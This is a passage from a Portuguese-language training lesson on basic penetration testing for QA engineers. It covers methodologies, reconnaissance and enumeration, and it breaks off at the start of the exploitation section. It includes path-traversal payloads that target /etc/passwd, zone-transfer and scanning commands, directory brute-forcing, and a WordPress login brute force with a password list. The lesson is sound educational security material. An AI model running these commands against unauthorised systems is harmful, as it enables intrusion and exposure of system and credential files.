---
layout: lesson
title: "Aula 2.3: Testes de Penetração (Pentest) Básico"
slug: pentest-basico
module: module-2
lesson_id: lesson-2-3
duration: "120 minutos"
level: "Avançado"
prerequisites: ["lesson-2-2"]
exercises:
  - lesson-2-3-exercise-1-recon-osint
  - lesson-2-3-exercise-2-nmap-enumeration
  - lesson-2-3-exercise-3-metasploit-exploit
  - lesson-2-3-exercise-4-burp-suite-manual
  - lesson-2-3-exercise-5-privilege-escalation
  - lesson-2-3-exercise-6-pentest-report
  - lesson-2-3-exercise-7-api-pentest
video:
  file: "assets/module-2/videos/2.3-Pentest_Basico.mp4"
  title: "Testes de Penetração (Pentest) Básico"
  thumbnail: "assets/module-2/images/infograficos/infografico-lesson-2-3.png"
image: "assets/module-2/images/podcasts/2.3-Pentest_Basico.png"
permalink: /modules/testes-seguranca-pratica/lessons/pentest-basico/
---

<!-- # Aula 2.3: Testes de Penetração (Pentest) Básico -->

## ⚡ TL;DR (5 minutos)

**O que você vai aprender**: Pentest combina ferramentas automatizadas com análise manual criativa para simular ataques reais e encontrar vulnerabilidades que SAST/DAST não detectam.

**Por que importa**: Falhas de lógica de negócio, chains de ataque e 0-days só são detectados por pentest manual. Ferramentas automatizadas cobrem 70%, pentest cobre os 30% restantes.

**Ferramentas principais**: Nmap (reconhecimento), OWASP ZAP/Burp Suite (web apps), SQLMap (SQL injection), Nikto (web servers)

**Aplicação prática**: QA aprende a interpretar relatórios de pentest, priorizar findings por contexto de negócio e colaborar com pentesters especializados.

**Tempo de leitura completa**: 120 minutos  
**Exercícios**: 7 (3 básicos, 2 intermediários, 2 avançados ⭐)

---

## 🎯 Objetivos de Aprendizado

Ao final desta aula, você será capaz de:

- [ ] Compreender o que são testes de penetração e sua importância
- [ ] Diferenciar pentest de outras metodologias de teste de segurança
- [ ] Conhecer as principais metodologias de pentest (OWASP, PTES, NIST)
- [ ] Executar testes de penetração básicos em aplicações web
- [ ] Interpretar resultados de pentest e criar relatórios
- [ ] Entender o ciclo de vida de um pentest
- [ ] Aplicar técnicas básicas de reconhecimento e enumeração

---

## 📚 Introdução ao Pentest

### O que é Pentest?

**Testes de Penetração (Pentest)** são simulações controladas de ataques reais realizadas por profissionais de segurança com o objetivo de identificar vulnerabilidades exploráveis em sistemas, aplicações e infraestrutura. Diferente de testes automatizados (SAST/DAST), pentest envolve **análise manual criativa** e **pensamento como um atacante**, explorando falhas que ferramentas automatizadas não detectam.

**Características principais:**

- **Simulação realista**: Reproduz táticas, técnicas e procedimentos (TTPs) de atacantes reais
- **Abordagem manual**: Combina ferramentas automatizadas com expertise humano
- **Objetivo específico**: Explorar vulnerabilidades até o limite autorizado
- **Controle e autorização**: Sempre realizado com permissão explícita por escrito
- **Documentação detalhada**: Gera relatórios técnicos e executivos com evidências

#### 🎭 Analogia: O Ladrão Contratado

Imagine que você contratou um **ladrão profissional reformado** para testar a segurança da sua casa. Ele não apenas verifica se as portas estão trancadas (como faria um DAST), mas **tenta todas as estratégias reais de invasão**:

- **Reconhecimento**: Observa sua rotina, horários que você sai, se tem alarme
- **Teste de vulnerabilidades**: Tenta abrir janelas, procura chaves escondidas, testa fechaduras
- **Exploração**: Se encontra uma janela mal fechada, entra e documenta o que conseguiria roubar
- **Relatório**: Entrega um documento mostrando **exatamente como invadiu** e o que fazer para impedir

**Pentest é isso**: contratar um "atacante do bem" para encontrar falhas antes que atacantes reais as explorem.

### Por que Pentest é Importante?

Ferramentas automatizadas (SAST/DAST/SCA) são excelentes para detectar vulnerabilidades conhecidas, mas **não substituem pensamento crítico humano**. Pentest identifica:

✅ **Falhas de lógica de negócio**: Promoções aplicadas múltiplas vezes, bypasses em fluxos de aprovação  
✅ **Combinações de vulnerabilidades**: Exploits que só funcionam encadeando múltiplas falhas  
✅ **Contexto empresarial**: Riscos específicos do negócio que ferramentas genéricas ignoram  
✅ **Engenharia social**: Vetores de ataque envolvendo manipulação humana  
✅ **Validação de controles**: Testa se correções aplicadas realmente funcionam  

#### Benefícios do Pentest

| Benefício | Descrição | Impacto |
|-----------|-----------|---------|
| **Validação de Segurança Real** | Prova que controles de segurança funcionam contra ataques reais, não apenas em teoria | 🎯 Alto - Identifica falhas críticas antes de invasões reais |
| **Priorização Baseada em Risco** | Vulnerabilidades são classificadas por impacto real explorado, não apenas severidade teórica | 📊 Alto - Foca esforços de correção no que realmente importa |
| **Conformidade e Compliance** | Atende requisitos de PCI-DSS, ISO 27001, SOC2 que exigem testes de penetração periódicos | ✅ Médio - Evita multas e problemas com auditorias |
| **Treinamento Prático da Equipe** | Times de dev/QA/ops aprendem com exemplos reais de exploração | 🎓 Médio - Aumenta consciência de segurança |
| **Confiança de Clientes e Investidores** | Demonstra maturidade de segurança com evidências objetivas | 💼 Médio - Diferencial competitivo em RFPs |

### Contexto Histórico

```
📅 Evolução do Pentest

1960s - 📞 Phone Phreaking
        └─ Hackers exploram sistemas telefônicos (AT&T)
        └─ Kevin Mitnick e John Draper (Cap'n Crunch)

1970s - 🔐 Tiger Teams (Forças Armadas EUA)
        └─ Primeiros times de "invasores autorizados"
        └─ Testavam segurança de bases militares

1980s - 💻 Hacking Ético Emerge
        └─ Termo "ethical hacking" cunhado
        └─ Empresas começam contratar hackers

1990s - 🌐 Pentest em Aplicações Web
        └─ Internet comercial explode
        └─ Primeiras empresas de pentest (ISS, @stake)
        └─ 1995: Dan Farmer lança SATAN (scanner de vulnerabilidades)

2000s - 🏆 Certificações e Metodologias
        └─ 2003: Lançamento CEH (Certified Ethical Hacker)
        └─ 2007: OWASP Testing Guide v2
        └─ 2009: PTES (Penetration Testing Execution Standard)

2010s - 🤖 Automação + Manual
        └─ Ferramentas automatizadas evoluem (Metasploit, Burp Suite Pro)
        └─ Bug Bounty Programs (HackerOne, Bugcrowd)
        └─ Red Team vs Blue Team se populariza

2020s - ☁️ Cloud & DevSecOps
        └─ Pentest contínuo integrado em CI/CD
        └─ Foco em APIs, microserviços, containers
        └─ AI-assisted pentesting (Copilot para pentest)
```

**Marcos importantes:**

- **1988**: Robert Morris lança o primeiro worm da internet (não intencional, mas mostrou necessidade de testes)
- **1995**: Phrack Magazine publica artigos técnicos de exploração que se tornam base do pentest moderno
- **2003**: Sarbanes-Oxley exige controles de segurança em empresas públicas (aumenta demanda por pentest)
- **2013**: Edward Snowden revela programas da NSA (aumenta consciência sobre segurança e privacidade)
- **2017**: Equifax breach expõe dados de 147 milhões (pentest poderia ter detectado vulnerabilidade Apache Struts explorada)

---

## 👥 Papel do QA vs Pentester: Entenda sua Responsabilidade

### Por que esta seção é importante para você (QA)?

Como **QA de segurança**, você **NÃO é um pentester especializado**. Seu papel é diferente mas complementar. Esta seção esclarece **o que é esperado de você** vs **o que é responsabilidade de um pentester profissional**, evitando confusão e expectativas inadequadas.

### Comparação: QA Security vs Pentester

| Aspecto | QA Security (Você) | Pentester Especializado |
|---------|-------------------|------------------------|
| **Foco principal** | Prevenir vulnerabilidades via testes automatizados e detecção precoce | Explorar vulnerabilidades manualmente com técnicas avançadas de ataque |
| **Ferramentas usadas** | SAST, DAST, SCA integrados no CI/CD (SonarQube, OWASP ZAP, Snyk) | Ferramentas manuais avançadas (Metasploit Pro, Burp Suite Pro, exploits customizados) |
| **Frequência** | Contínuo - a cada commit/merge/deploy | Periódico - trimestral/semestral ou antes de releases |
| **Profundidade** | Testes de regressão, validações, casos de borda conhecidos | Exploração criativa profunda, chains de ataque, 0-days |
| **Conhecimento requerido** | OWASP Top 10, ferramentas SAST/DAST, interpretação de CVEs | Exploitation avançada, post-exploitation, OS internals, network hacking |
| **Certificações típicas** | ISTQB Advanced Security, Certified Secure Software Tester | OSCP, CEH, GWAPT, GPEN |
| **Custo/salário** | R$ 8-15k/mês | R$ 15-30k/mês (especialistas) |
| **Output** | Issues em Jira, vulnerabilidades detectadas, testes automatizados | Relatório executivo + técnico detalhado com PoCs de exploração |
| **Você faz isso?** | ✅ SIM - é seu dia a dia | ❌ NÃO - requer especialização dedicada |

### O que QA Security DEVE fazer (Sua Responsabilidade)

```
✅ RESPONSABILIDADES DO QA:

1️⃣ TESTES AUTOMATIZADOS DE SEGURANÇA
   ├─ Configurar e manter SAST no CI/CD
   ├─ Configurar e manter DAST (baseline scans)
   ├─ Configurar e manter SCA (dependency scanning)
   ├─ Criar testes de regressão para vulnerabilidades corrigidas
   └─ Monitorar dashboards de segurança

2️⃣ VALIDAÇÃO DE VULNERABILIDADES (Análise de Resultados)
   ├─ Interpretar findings de ferramentas automatizadas
   ├─ Identificar e marcar false positives
   ├─ Priorizar vulnerabilidades por contexto de negócio
   ├─ Reproduzir vulnerabilidades manualmente para validar
   └─ Documentar steps to reproduce em issues

3️⃣ COLABORAÇÃO COM PENTESTER
   ├─ Fornecer acesso aos ambientes de teste
   ├─ Explicar funcionalidades e fluxos de negócio
   ├─ Interpretar relatórios de pentest recebidos
   ├─ Validar que correções propostas funcionam
   └─ Criar testes automatizados para findings de pentest

4️⃣ TESTES EXPLORATÓRIOS BÁSICOS
   ├─ Fuzzing de inputs com payloads comuns (SQLi, XSS)
   ├─ Testar controles de acesso (IDOR, privilege escalation)
   ├─ Validar configurações de segurança (headers, cookies)
   ├─ Testar lógica de negócio (aplicar cupom 2x, etc)
   └─ Usar Burp Suite Community para interceptar requests

5️⃣ QUALITY GATES E POLÍTICAS
   ├─ Definir critérios de bloqueio (Critical/High)
   ├─ Gerenciar exceções justificadas
   ├─ Reportar métricas de segurança para gestão
   └─ Manter documentação de processos
```

### O que PENTESTER Especializado faz (NÃO é esperado de QA)

```
❌ NÃO É SUA RESPONSABILIDADE (requer especialista):

1️⃣ EXPLOITATION AVANÇADO
   ├─ Desenvolver exploits customizados (0-day)
   ├─ Reverse engineering de binários
   ├─ Exploração de kernel vulnerabilities
   ├─ Buffer overflow, ROP chains, heap spraying
   └─ Cryptographic attacks avançados

2️⃣ POST-EXPLOITATION PROFUNDO
   ├─ Privilege escalation com técnicas avançadas
   ├─ Lateral movement (Pass-the-Hash, Kerberoasting)
   ├─ Persistence mechanisms (backdoors, rootkits)
   ├─ Credential dumping (Mimikatz, DCSync)
   └─ Exfiltração de dados sensíveis

3️⃣ RED TEAM OPERATIONS
   ├─ Engenharia social complexa (pretexting, vishing)
   ├─ Physical security testing (invasão física)
   ├─ Supply chain attacks
   ├─ APT simulation (ataques persistentes)
   └─ Evasion de EDR/SIEM/Blue Team

4️⃣ PESQUISA DE VULNERABILIDADES
   ├─ Bug hunting em aplicações complexas
   ├─ Descoberta de 0-days
   ├─ Análise de protocolos proprietários
   ├─ Firmware analysis
   └─ Fuzzing avançado (AFL++, LibFuzzer)
```

### Fluxo de Colaboração: QA → Pentester

```
┌────────────────────────────────────────────────────────────────┐
│           Workflow: QA Security + Pentester                    │
└────────────────────────────────────────────────────────────────┘

FASE 1: QA DETECTA (Automação)
   ↓
   QA executa: SAST + DAST + SCA automatizados
   ↓
   Encontra: 50 vulnerabilidades (15 Critical, 20 High, 15 Medium)
   ↓
   QA valida: Remove 10 false positives
   ↓
   QA corrige: 30 vulnerabilidades óbvias (SQLi, XSS, outdated deps)
   ↓
   RESTAM: 10 vulnerabilidades complexas ou exploração incerta

FASE 2: QA ESCALA PARA PENTESTER
   ↓
   QA documenta:
   - 10 vulnerabilidades que não consegue validar
   - Áreas críticas de negócio (checkout, admin, APIs)
   - Credenciais de teste (staging/QA)
   - Documentação de fluxos de negócio
   ↓
   Pentester recebe escopo preparado (economiza tempo)

FASE 3: PENTESTER EXPLORA (Manual)
   ↓
   Pentester executa:
   - Exploração manual criativa das 10 vulnerabilidades
   - Chains de ataque (XSS → cookie stealing → account takeover)
   - Falhas de lógica de negócio (cupom múltiplo, race conditions)
   - Social engineering (se autorizado)
   ↓
   Encontra: 8 vulnerabilidades adicionais que ferramentas não detectaram
   ↓
   Entrega: Relatório executivo + técnico com 18 findings

FASE 4: QA VALIDA CORREÇÕES
   ↓
   Dev corrige 18 vulnerabilidades
   ↓
   QA valida:
   - Reproduz exploits do relatório (steps to reproduce)
   - Confirma que correções funcionam
   - Cria testes de regressão automatizados
   ↓
   QA escala de volta: Se ainda reproduz, reporta para pentester
   ↓
   ENCERRAMENTO: Todas as vulnerabilidades corrigidas e testadas
```

### Mensagem-Chave para QAs

```
┌────────────────────────────────────────────────────────────────┐
│                                                                │
│  Você (QA Security) é a PRIMEIRA LINHA DE DEFESA              │
│  Pentester é a SEGUNDA LINHA (validação profunda)             │
│                                                                │
│  Seu objetivo: Detectar 70-80% das vulnerabilidades com       │
│  automação ANTES de precisar de pentester.                    │
│                                                                │
│  Pentester pega os 20-30% restantes que ferramentas não       │
│  conseguem (lógica de negócio, chains, 0-days).               │
│                                                                │
│  Ambos são essenciais. Você NÃO precisa ser um pentester      │
│  expert para ser um excelente QA de segurança.                │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

**O que esta aula ensina:**
- ✅ **Conceitos de pentest**: Para você entender relatórios e colaborar efetivamente
- ✅ **Ferramentas básicas**: Nmap, OWASP ZAP, Nikto - que QA usa no dia a dia
- ✅ **Interpretação de relatórios**: Como priorizar findings de pentester
- ❌ **Exploitation avançado**: Metasploit, privilege escalation - mostramos para conhecimento, mas não é esperado que você domine

**Quando escalar para pentester:**
- Vulnerabilidade parece exploitável mas você não consegue reproduzir
- Suspeita de falha de lógica de negócio complexa
- Antes de releases importantes (validação profunda)
- Compliance exige pentest anual (PCI-DSS, ISO 27001)
- Após incidente de segurança (análise forense)

---

## 🔄 Metodologias de Pentest

### 1. OWASP Testing Guide

**Definição**: Guia completo de testes de segurança para aplicações web mantido pela OWASP (Open Web Application Security Project). É a referência global para pentest de aplicações web, com **metodologia estruturada** e **checklist detalhado** de testes.

**Versão atual**: OWASP Testing Guide v4.2 (2024)

**Estrutura do guia:**

```
📖 OWASP Testing Guide v4.2

1️⃣ Introduction and Objectives
   └─ Princípios de testes de segurança

2️⃣ Testing Framework
   ├─ Phase 1: Before Development Begins
   ├─ Phase 2: During Definition and Design
   ├─ Phase 3: During Development
   ├─ Phase 4: During Deployment
   └─ Phase 5: Maintenance and Operations

3️⃣ Testing Techniques Explained
   ├─ Manual Inspections & Reviews
   ├─ Threat Modeling
   └─ Code Review

4️⃣ Web Application Security Testing
   ├─ 01. Information Gathering (12 testes)
   ├─ 02. Configuration and Deployment Management (11 testes)
   ├─ 03. Identity Management (10 testes)
   ├─ 04. Authentication (9 testes)
   ├─ 05. Authorization (6 testes)
   ├─ 06. Session Management (9 testes)
   ├─ 07. Input Validation (21 testes)
   ├─ 08. Error Handling (2 testes)
   ├─ 09. Cryptography (4 testes)
   ├─ 10. Business Logic (9 testes)
   ├─ 11. Client-side Testing (13 testes)
   └─ 12. API Testing (2 testes)

TOTAL: 108 testes específicos
```

**Por que usar OWASP Testing Guide:**

✅ **Completo e estruturado**: Cobre todas as áreas de segurança de aplicações web  
✅ **Community-driven**: Mantido por milhares de especialistas globalmente  
✅ **Alinhado com OWASP Top 10**: Testes cobrem as vulnerabilidades mais críticas  
✅ **Gratuito e open-source**: Sem custos, sempre atualizado  
✅ **Reconhecido globalmente**: Aceito em auditorias e compliance  

**Exemplo de teste (WSTG-ATHZ-01: Directory Traversal)**:

```bash
# Teste de Directory Traversal
# Objetivo: Verificar se aplicação permite acesso a arquivos fora do diretório web

# 1. Teste básico de path traversal
GET /download?file=../../../../etc/passwd HTTP/1.1
Host: example.com

# 2. Encoding duplo
GET /download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1

# 3. URL encoding
GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1

# 4. Unicode/UTF-8 encoding
GET /download?file=..%c0%af..%c0%afetc%c0%afpasswd HTTP/1.1

# Resultado esperado:
# ✅ SEGURO: Retorna erro 400/403/404
# ❌ VULNERÁVEL: Retorna conteúdo de /etc/passwd
```

### 2. PTES (Penetration Testing Execution Standard)

**Definição**: Framework técnico que define **metodologia completa** para execução de testes de penetração, desde pré-engajamento até relatório final. Criado por profissionais de pentest para padronizar a indústria.

**Objetivo**: Garantir que pentests sejam executados de forma **consistente, reproduzível e abrangente**, independente da empresa ou profissional que executa.

**7 Fases do PTES:**

```
┌─────────────────────────────────────────────────────────────┐
│                   PTES - 7 Phases                           │
└─────────────────────────────────────────────────────────────┘

1️⃣ PRE-ENGAGEMENT INTERACTIONS
   └─ Escopo, autorizações, contratos, regras de engajamento
   └─ Definir objetivos, limites, canais de comunicação
   └─ Questões legais e éticas

2️⃣ INTELLIGENCE GATHERING (Reconhecimento)
   ├─ OSINT: Informações públicas (DNS, whois, redes sociais)
   ├─ Footprinting: Mapeamento de infraestrutura
   └─ Identificação de tecnologias e versões

3️⃣ THREAT MODELING
   └─ Análise de vetores de ataque possíveis
   └─ Priorização baseada em impacto e probabilidade
   └─ Definição de cenários de ataque

4️⃣ VULNERABILITY ANALYSIS
   ├─ Testes automatizados (Nessus, OpenVAS, Nmap)
   ├─ Testes manuais específicos
   └─ Validação de vulnerabilidades (redução de falsos positivos)

5️⃣ EXPLOITATION
   └─ Exploração de vulnerabilidades confirmadas
   └─ Obtenção de acesso inicial (foothold)
   └─ Documentação de evidências (screenshots, logs)

6️⃣ POST-EXPLOITATION
   ├─ Escalação de privilégios
   ├─ Movimento lateral (lateral movement)
   ├─ Persistência (manter acesso)
   ├─ Exfiltração de dados (simular roubo de dados)
   └─ Pivoting (usar sistema comprometido para atacar outros)

7️⃣ REPORTING
   └─ Relatório Executivo (para C-level, gestão)
   └─ Relatório Técnico (para dev/ops, detalhes técnicos)
   └─ Recomendações priorizadas de remediação
```

**Exemplo de documentação de escopo (Fase 1: Pre-engagement):**

```yaml
# Exemplo de documento de escopo PTES
engagement:
  client: "Empresa XYZ Ltda"
  type: "External Black Box Pentest"
  duration: "2 semanas"
  start_date: "2024-02-01"
  end_date: "2024-02-14"

scope:
  in_scope:
    - "*.exemplo.com.br (todos os subdomínios)"
    - "API pública: api.exemplo.com.br"
    - "Aplicação mobile: app iOS/Android"
  
  out_of_scope:
    - "Servidores internos (sem VPN fornecida)"
    - "Sistemas de terceiros (pagamento, analytics)"
    - "Engenharia social (phishing)"
  
  limitations:
    - "Não executar DoS/DDoS"
    - "Não deletar/modificar dados de produção"
    - "Testes apenas em horário comercial (9h-18h)"
    - "Notificar imediatamente se encontrar dados sensíveis"

contacts:
  technical: "devops@exemplo.com.br"
  emergency: "+55 11 98765-4321"
  escalation: "ciso@exemplo.com.br"

rules_of_engagement:
  - "Stop immediately if production impact detected"
  - "Daily status updates via Slack #pentest-channel"
  - "Exploitation limited to proof-of-concept (não exfiltrar dados reais)"
```

### 3. NIST SP 800-115

**Definição**: **Technical Guide to Information Security Testing and Assessment** publicado pelo NIST (National Institute of Standards and Technology). É a metodologia usada pelo governo dos EUA e amplamente adotada globalmente para **avaliação de segurança de sistemas**.

**Foco**: Processo **completo de avaliação de segurança**, incluindo planejamento, execução, análise e relatório, com ênfase em **gestão de risco**.

**Diferencial do NIST SP 800-115:**

- **Abordagem baseada em risco**: Prioriza testes em áreas de maior risco ao negócio
- **Integração com outros frameworks NIST**: RMF (Risk Management Framework), NIST CSF
- **Processo documentado e auditável**: Perfeito para ambientes regulados (governo, finanças, saúde)
- **Tipos múltiplos de testes**: Review, Target Identification, Vulnerability Scanning, Penetration Testing

**4 Técnicas de Teste do NIST:**

```
┌─────────────────────────────────────────────────────────────┐
│          NIST SP 800-115 Testing Techniques                 │
└─────────────────────────────────────────────────────────────┘

1️⃣ REVIEW TECHNIQUES (Análise Passiva)
   ├─ Documentation Review
   │  └─ Políticas, procedimentos, diagramas de rede
   ├─ Log Review
   │  └─ Análise de logs de segurança, firewall, IDS
   ├─ Ruleset Review
   │  └─ Configurações de firewall, router, IPS
   └─ System Configuration Review
      └─ Hardening checks (CIS Benchmarks)

2️⃣ TARGET IDENTIFICATION & ANALYSIS (Reconhecimento)
   ├─ Network Discovery (Nmap, Masscan)
   ├─ Network Port/Service Identification
   ├─ Wireless Scanning (Aircrack-ng)
   └─ Identification of Services/Protocols

3️⃣ VULNERABILITY SCANNING (Automatizado)
   ├─ Network Vulnerability Scanners
   │  └─ Nessus, OpenVAS, Qualys
   ├─ Application Scanners
   │  └─ OWASP ZAP, Burp Suite, Acunetix
   └─ Database Scanners
      └─ SQLMap, DbProtect

4️⃣ PENETRATION TESTING (Manual + Exploitation)
   ├─ External Pentest
   ├─ Internal Pentest
   ├─ Web Application Pentest
   ├─ Wireless Pentest
   ├─ Social Engineering
   └─ Physical Security Testing
```

**Comparação entre as metodologias:**

| Aspecto | OWASP Testing Guide | PTES | NIST SP 800-115 |
|---------|---------------------|------|-----------------|
| **Foco principal** | Aplicações web | Processo completo de pentest | Avaliação de segurança governamental |
| **Nível de detalhe** | ⭐⭐⭐⭐⭐ (108 testes específicos) | ⭐⭐⭐⭐ (framework geral) | ⭐⭐⭐ (orientações amplas) |
| **Público-alvo** | Pentesters web, QA Security | Pentesters profissionais | Organizações governamentais, compliance |
| **Atualização** | Frequente (community-driven) | Estável desde 2014 | Estável (publicação oficial) |
| **Custo** | Gratuito | Gratuito | Gratuito |
| **Certificações relacionadas** | OSWE, OSWA | OSCP, CEH | GPEN, CISSP |
| **Melhor para** | Testes de apps web/APIs | Pentests completos de infraestrutura | Compliance e ambientes regulados |

---

## 📋 Fases do Pentest

### 1. Planejamento e Reconhecimento

**Definição**: Fase inicial onde se **coleta informações sobre o alvo** antes de qualquer teste técnico. O objetivo é entender a superfície de ataque, identificar pontos de entrada e criar um mapa do ambiente alvo. É a fase mais importante - **80% do sucesso do pentest depende de um bom reconhecimento**.

**Tipos de reconhecimento:**

```
┌─────────────────────────────────────────────────────────────┐
│                  Tipos de Reconhecimento                    │
└─────────────────────────────────────────────────────────────┘

📡 PASSIVE RECONNAISSANCE (Passivo)
   └─ Coleta informações SEM interagir diretamente com o alvo
   └─ Não deixa rastros nos logs do alvo
   └─ Legal e seguro (informações públicas)
   
   Técnicas:
   ├─ OSINT (Open Source Intelligence)
   ├─ Google Dorking (operadores avançados de busca)
   ├─ Whois, DNS records (dig, nslookup)
   ├─ Redes sociais (LinkedIn, GitHub, Twitter)
   ├─ Shodan/Censys (busca de dispositivos expostos)
   └─ Wayback Machine (versões antigas de sites)

🎯 ACTIVE RECONNAISSANCE (Ativo)
   └─ Interage DIRETAMENTE com sistemas do alvo
   └─ Deixa rastros em logs (IDS/IPS pode detectar)
   └─ Requer autorização explícita no escopo
   
   Técnicas:
   ├─ Port scanning (Nmap, Masscan)
   ├─ Service enumeration (versões de serviços)
   ├─ DNS enumeration (subdomínios, zone transfers)
   ├─ Web crawling/spidering
   └─ Network mapping (traceroute, ping sweep)
```

**Técnicas de OSINT (Open Source Intelligence):**

| Técnica | Ferramentas | O que buscar | Exemplo |
|---------|-------------|--------------|---------|
| **Google Dorking** | Google + operadores avançados | Arquivos expostos, painéis admin, erros | `site:exemplo.com filetype:pdf "confidencial"` |
| **Whois/DNS** | whois, dig, dnsenum | Informações de domínio, subdomínios | `whois exemplo.com`, `dig exemplo.com ANY` |
| **GitHub/GitLab** | GitHub search, truffleHog | Credenciais hardcoded, API keys, configs | `org:empresa "password"` |
| **Shodan** | Shodan.io | Dispositivos IoT, servidores expostos | `org:"Empresa XYZ" port:22` |
| **LinkedIn** | LinkedIn, theHarvester | Estrutura organizacional, tecnologias usadas | Buscar "DevOps Engineer at Empresa" |
| **Wayback Machine** | archive.org | Versões antigas com vulnerabilidades | Ver como API funcionava em 2020 |

**Exemplo prático de reconhecimento:**

```bash
# ============================================================================
# EXEMPLO: Reconhecimento completo de exemplo.com
# ============================================================================

# 1. WHOIS - Informações do domínio
whois exemplo.com
# Output: Registrador, nameservers, data de registro, contatos

# 2. DNS Enumeration - Descobrir subdomínios
dig exemplo.com ANY
dig @ns1.exemplo.com exemplo.com AXFR  # Tenta zone transfer (raro funcionar)

# 3. Sublist3r - Enumerar subdomínios via múltiplas fontes
sublist3r -d exemplo.com -o subdominios.txt
# Busca em: Google, Bing, Yahoo, Baidu, Ask, Netcraft, DNSdumpster, VirusTotal

# 4. TheHarvester - Coletar emails, subdomínios, hosts
theHarvester -d exemplo.com -b google,linkedin,bing -l 500
# Output: 
# Emails: dev@exemplo.com, admin@exemplo.com
# Hosts: mail.exemplo.com, vpn.exemplo.com

# 5. Shodan - Buscar ativos expostos
shodan search "org:Empresa Exemplo"
# Output: IPs expostos, serviços rodando, portas abertas, versões de software

# 6. Google Dorking - Buscar informações sensíveis
# site:exemplo.com filetype:pdf
# site:exemplo.com inurl:admin
# site:exemplo.com ext:sql | ext:txt "password"
# site:exemplo.com intitle:"index of" "backup"

# 7. WaybackURLs - Coletar URLs históricas
waybackurls exemplo.com | tee urls_historicas.txt
# Pode revelar endpoints antigos esquecidos e vulneráveis

# 8. Nuclei - Templates para encontrar painéis expostos
nuclei -l subdominios.txt -t exposed-panels/

# ============================================================================
# RESULTADO: Mapa da superfície de ataque
# ============================================================================
# ✅ 15 subdomínios descobertos
# ✅ 3 painéis admin expostos (Jenkins, phpMyAdmin, Grafana)
# ✅ 12 emails de funcionários coletados
# ✅ Stack técnico identificado: Node.js, MongoDB, AWS
# ✅ Versões desatualizadas: Jenkins 2.289 (CVE-2021-21642)
```

### 2. Varredura e Enumeração

**Definição**: Fase de **identificação ativa de portas, serviços, versões e possíveis vulnerabilidades** nos sistemas do alvo. Aqui começamos a interagir diretamente com a infraestrutura para mapear o que está rodando.

**Objetivos:**
- Identificar portas abertas e serviços em execução
- Determinar versões de sistemas operacionais e aplicações
- Enumerar usuários, compartilhamentos, configurações
- Criar inventário completo de ativos

**Ferramentas principais:**

```bash
# ============================================================================
# 1. NMAP - Port Scanning & Service Detection
# ============================================================================

# Scan rápido de portas mais comuns
nmap -T4 -F exemplo.com

# Scan completo com detecção de SO e versões
nmap -sS -sV -O -A exemplo.com

# Scan em toda subnet (descobrir hosts ativos)
nmap -sn 192.168.1.0/24

# Scan de vulnerabilidades com scripts NSE
nmap --script vuln exemplo.com

# Output exemplo:
# PORT     STATE SERVICE  VERSION
# 22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
# 80/tcp   open  http     Apache httpd 2.4.41
# 443/tcp  open  ssl/http Apache httpd 2.4.41
# 3306/tcp open  mysql    MySQL 5.7.31

# ============================================================================
# 2. MASSCAN - Scanning ultra-rápido de grandes redes
# ============================================================================

# Scan de porta 80/443 em todo range /16 em minutos
masscan 10.0.0.0/16 -p80,443 --rate=10000

# Scan de todas as portas em IP específico
masscan 192.168.1.100 -p0-65535 --rate=1000

# ============================================================================
# 3. ENUM4LINUX - Enumeração de servidores Windows/Samba
# ============================================================================

# Enumerar compartilhamentos, usuários, políticas
enum4linux -a 192.168.1.10

# Output:
# [+] Users on 192.168.1.10:
#     Administrator, Guest, user1, user2
# [+] Share Enumeration:
#     \\192.168.1.10\ADMIN$ (Disk)
#     \\192.168.1.10\C$ (Disk)

# ============================================================================
# 4. GOBUSTER - Enumeração de diretórios e arquivos web
# ============================================================================

# Descobrir diretórios escondidos
gobuster dir -u https://exemplo.com -w /usr/share/wordlists/dirb/common.txt

# Descobrir subdomínios
gobuster dns -d exemplo.com -w /usr/share/wordlists/subdomains.txt

# Output:
# /admin (Status: 200)
# /backup (Status: 403)
# /api (Status: 200)
# /.git (Status: 200) ⚠️ CRITICAL!

# ============================================================================
# 5. WPSCAN - Scanner específico para WordPress
# ============================================================================

# Scan completo de site WordPress
wpscan --url https://exemplo.com --enumerate u,vp,vt

# Brute force de login
wpscan --url https://exemplo.com --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

**Exemplo de relatório de enumeração:**

```markdown
## Relatório de Enumeração - exemplo.com

### 🌐 Hosts Descobertos: 5

| IP | Hostname | OS | Status |
|----|----------|----|----- --|
| 192.168.1.10 | web01.exemplo.com | Ubuntu 20.04 | Online |
| 192.168.1.11 | db01.exemplo.com | CentOS 7 | Online |
| 192.168.1.12 | vpn.exemplo.com | pfSense 2.5 | Online |
| 192.168.1.20 | backup.exemplo.com | Windows Server 2016 | Online |
| 192.168.1.30 | jenkins.exemplo.com | Ubuntu 18.04 | Online |

### 🔌 Portas Abertas e Serviços

**192.168.1.10 (web01):**
- 22/tcp: OpenSSH 8.2p1 (Ubuntu)
- 80/tcp: Apache 2.4.41
- 443/tcp: Apache 2.4.41 (SSL: Let's Encrypt)

**192.168.1.11 (db01):**
- 22/tcp: OpenSSH 7.4
- 3306/tcp: MySQL 5.7.31 ⚠️ Acessível externamente (RISCO)

**192.168.1.30 (jenkins):**
- 8080/tcp: Jenkins 2.289 ⚠️ Versão vulnerável (CVE-2021-21642)

### 🔍 Diretórios/Arquivos Descobertos

**https://exemplo.com:**
- `/admin` → 302 (redirect to /login)
- `/api` → 200 (API endpoint sem autenticação)
- `/.git` → 200 ⚠️ CRÍTICO: Repositório git exposto!
- `/backup.sql` → 200 ⚠️ CRÍTICO: Backup de banco exposto!
- `/phpinfo.php` → 200 ⚠️ Info disclosure

### ⚠️ Vulnerabilidades Potenciais Identificadas

1. **MySQL exposto externamente** (db01:3306)
2. **Repositório .git acessível** (web01)
3. **Jenkins desatualizado** com CVE crítico (jenkins)
4. **Backup de banco acessível** sem autenticação (web01)
5. **phpinfo.php exposto** revela configurações sensíveis
```

### 3. Exploração de Vulnerabilidades

**Definição**: Fase onde **tentamos explorar as vulnerabilidades descobertas** para ganhar acesso não autorizado, elevar privilégios ou demonstrar impacto real. É a fase mais técnica e que requer maior cuidado para não causar danos.

**⚠️ Regras críticas de exploração:**

```
❌ NUNCA faça em produção sem autorização explícita:
   - Deletar ou modificar dados reais
   - Executar DoS/DDoS
   - Acessar dados sensíveis além do necessário para PoC
   - Instalar backdoors permanentes

✅ SEMPRE:
